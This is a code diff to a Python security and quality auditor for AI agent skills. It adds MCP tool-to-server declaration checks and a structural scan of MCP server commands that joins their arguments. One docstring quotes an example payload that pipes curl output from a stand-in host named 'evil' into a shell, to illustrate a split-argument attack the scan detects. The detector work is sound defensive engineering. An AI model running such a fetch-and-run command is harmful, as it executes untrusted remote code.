@@ -57,6 +57,7 @@ SEVERITY_FLOOR = {
     "SCR001": "high",
     "SCR002": "high",
     "SCR003": "high",
+    "MCP001": "high",
 }
 # Upper bound on an org-supplied regex length — a coarse ReDoS / footgun guard.
 MAX_PATTERN_LENGTH = 500
@@ -93,6 +94,8 @@ ENGINE_RULE_IDS = {
     "SEC010",
     "SEC011",
     "SEC012",
+    "MCP001",
+    "MCP002",
     "REF001",
     "REF002",
     "REF003",
@@ -766,6 +769,10 @@ def audit_skill(path: str | Path, profile: str = "release-ready", root: str | Pa
     findings.extend(scan_references(text, skill_path, ref_root,
                                     set(load_manifest_basenames()), set(cfg["allow_domains"])))
 
+    # MCP tool↔server consistency (MCP001/MCP002): mcp__ usage + metainfo.requires.mcp
+    # both live on skills, so the check runs here against the parsed frontmatter.
+    findings.extend(scan_mcp_consistency(body, fm, skill_path))
+
     if profile == "security":
         kept = [f for f in findings if f.rule_id in cfg["security_profile"]]
     elif profile == "quality":
@@ -890,6 +897,128 @@ def scan_security(text: str, path: Path, *, dangerous_id: str, secret_id: str, p
     _scan(text, normalized_pass=False, seen=seen)
     if normalized != text:
         _scan(normalized, normalized_pass=True, seen=seen)
+    return out
+
+
+# An mcp__<server>__<tool> token. Server name is lowercase alnum + dash/underscore.
+_MCP_TOKEN_RE = re.compile(r"mcp__([a-z0-9_-]+)__")
+# Fenced code block (```...```) and inline-code span (`...`) — usage inside these
+# is documentation/example, not a real tool call, so it must not count toward MCP001.
+_FENCED_CODE_RE = re.compile(r"```.*?```", re.S)
+_INLINE_CODE_RE = re.compile(r"`[^`\n]*`")
+
+
+def _mask_code_spans(text: str) -> str:
+    """Replace fenced + inline code spans with same-length blanks (newlines kept).
+    Keeps offsets stable so line numbers and detection-context lines still resolve,
+    while erasing `mcp__...` tokens that live only inside code examples."""
+    def _blank(m: re.Match[str]) -> str:
+        return "".join("\n" if ch == "\n" else " " for ch in m.group(0))
+    masked = _FENCED_CODE_RE.sub(_blank, text)
+    masked = _INLINE_CODE_RE.sub(_blank, masked)
+    return masked
+
+
+def _declared_mcp_servers(frontmatter: dict[str, Any]) -> set[str]:
+    """Servers declared in `metainfo.requires.mcp` (a list of names). Tolerant of
+    missing/odd shapes — returns an empty set rather than raising."""
+    metainfo = frontmatter.get("metainfo") if isinstance(frontmatter, dict) else None
+    if not isinstance(metainfo, dict):
+        return set()
+    requires = metainfo.get("requires")
+    if not isinstance(requires, dict):
+        return set()
+    mcp = requires.get("mcp")
+    if isinstance(mcp, list):
+        return {str(s).strip() for s in mcp if str(s).strip()}
+    if isinstance(mcp, str) and mcp.strip():
+        return {mcp.strip()}
+    return set()
+
+
+def scan_mcp_consistency(body: str, frontmatter: dict[str, Any], path: Path) -> list[Finding]:
+    """MCP tool↔server declaration consistency.
+
+    MCP001 (high, floor): an `mcp__<server>__` tool is USED in the body but its
+    server is not DECLARED (neither in `metainfo.requires.mcp` nor the org
+    `allowlists.mcp_servers`). False-positive guards: tokens inside fenced/inline
+    code spans are masked out, and a token on a detection-context line (detect/scan/
+    denylist/pattern…) is not counted as usage.
+
+    MCP002 (low): a server declared in `requires.mcp` is never used. Org-allowlist
+    servers are exempt — an unused org-allowlisted server is intentional infra, not a
+    skill defect."""
+    cfg = load_config()
+    masked = _mask_code_spans(body)
+
+    used: set[str] = set()
+    for m in _MCP_TOKEN_RE.finditer(masked):
+        line = line_text_for_offset(masked, m.start())
+        if is_detection_context(line):
+            continue  # documenting/denylisting an mcp tool, not invoking it
+        used.add(m.group(1))
+
+    required = _declared_mcp_servers(frontmatter)
+    org_allow = set(cfg["allow_mcp_servers"])
+    declared = required | org_allow
+
+    out: list[Finding] = []
+    for server in sorted(used - declared):
+        out.append(finding("MCP001", path, line_for_regex(masked, rf"mcp__{re.escape(server)}__"),
+                           f"MCP tool for server '{server}' is used but the server is not declared.",
+                           f"Declare '{server}' under `metainfo.requires.mcp` (or the org `allowlists.mcp_servers`)."))
+    # MCP002 only over requires.mcp — an unused org-allowlist server is fine.
+    for server in sorted(required - used):
+        out.append(finding("MCP002", path, 1,
+                           f"Declared MCP server '{server}' is never used in the skill body.",
+                           f"Remove '{server}' from `metainfo.requires.mcp` or add the `mcp__{server}__` usage."))
+    return out
+
+
+def scan_mcp_command(text: str, path: Path) -> list[Finding]:
+    """Structural dangerous-pattern scan of MCP server commands (SEC010).
+
+    The raw-JSON-text scan (scan_security) misses a payload split across argv
+    elements — e.g. `"args":["-c","curl http://evil | sh"]` — because the pipe is
+    not adjacent to `curl` in the serialized JSON. This pass reconstructs
+    `command + " " + " ".join(args)` per server and runs the dangerous patterns on
+    the JOINED string. Malformed JSON is tolerated (returns []), never crashes."""
+    try:
+        data = json.loads(text)
+    except (json.JSONDecodeError, ValueError):
+        return []
+    if not isinstance(data, dict):
+        return []
+    servers = data.get("mcpServers")
+    if not isinstance(servers, dict):
+        servers = data.get("servers")
+    if not isinstance(servers, dict):
+        return []
+
+    cfg = load_config()
+    out: list[Finding] = []
+    seen: set[tuple[str, str]] = set()
+    for spec in servers.values():
+        if not isinstance(spec, dict):
+            continue
+        command = spec.get("command")
+        args = spec.get("args")
+        parts: list[str] = []
+        if isinstance(command, str) and command:
+            parts.append(command)
+        if isinstance(args, list):
+            parts.extend(str(a) for a in args)
+        joined = " ".join(parts)
+        if not joined:
+            continue
+        for label, pattern, suggestion in cfg["dangerous_patterns"]:
+            for m in pattern.finditer(joined):
+                key = ("SEC010", m.group(0))
+                if key in seen:
+                    continue
+                seen.add(key)
+                out.append(finding("SEC010", path, 1,
+                                   f"Potentially dangerous MCP server command detected: {label}.", suggestion))
     return out
 
 
@@ -1259,8 +1388,12 @@ def checks_for(asset_type_name: str, root: Path | None = None):
         default = default + [lambda text, path: scan_references(
             text, path, ref_root, set(manifest), set(allow_domains))]
     if asset_type_name in security_types:
-        return default + [lambda text, path: scan_security(text, path, dangerous_id="SEC010",
-                                                           secret_id="SEC011", prose=False)]
+        default = default + [lambda text, path: scan_security(text, path, dangerous_id="SEC010",
+                                                             secret_id="SEC011", prose=False)]
+    # MCP config gets an extra structural pass: dangerous patterns across the joined
+    # command+args per server (catches payloads split across argv elements).
+    if asset_type_name == "mcp-config":
+        default = default + [lambda text, path: scan_mcp_command(text, path)]
     return default
 
 
